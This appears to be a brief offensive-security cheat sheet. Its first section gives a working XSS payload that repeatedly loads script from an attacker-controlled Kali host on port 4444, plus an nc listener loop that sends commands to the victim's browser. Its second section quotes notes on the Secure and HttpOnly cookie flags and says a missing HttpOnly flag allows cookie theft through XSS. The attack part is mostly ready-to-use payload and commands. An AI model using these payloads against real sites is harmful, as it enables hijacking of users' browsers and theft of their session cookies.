### XSS to NC Reverse Shell
```
<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//your-kali-linux-ip:4444";d.body.appendChild(z)},0)</script>

while :; do printf "zemo>$ "; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; done {type in kali linu}
```

### XSS to steal cookie
>The Secure3 flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.

>The HttpOnly4 flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.
